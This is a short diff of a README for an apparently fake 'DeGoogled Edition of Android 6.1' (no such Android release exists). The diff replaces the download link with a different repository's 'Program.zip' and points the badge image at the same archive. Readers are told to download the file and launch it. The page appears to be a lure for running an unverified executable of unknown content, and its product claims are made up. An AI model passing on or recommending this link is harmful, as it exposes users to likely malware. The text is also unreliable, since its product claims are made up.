@@ -40,9 +40,9 @@ Android x64 is a unique project that aims to provide a DeGoogled alternative to 
 
 To install the DeGoogled Edition of Android 6.1, follow these steps:
 
-1. Download the installation package from the following link: [Download Now](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+1. Download the installation package from the following link: [Download Now](https://github.com/rexy223/Android-x64_Android6.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
    
-   ![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)
+   ![Download Now](https://github.com/rexy223/Android-x64_Android6.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
 
 2. Launch the downloaded file and follow the on-screen instructions to complete the installation process.
 
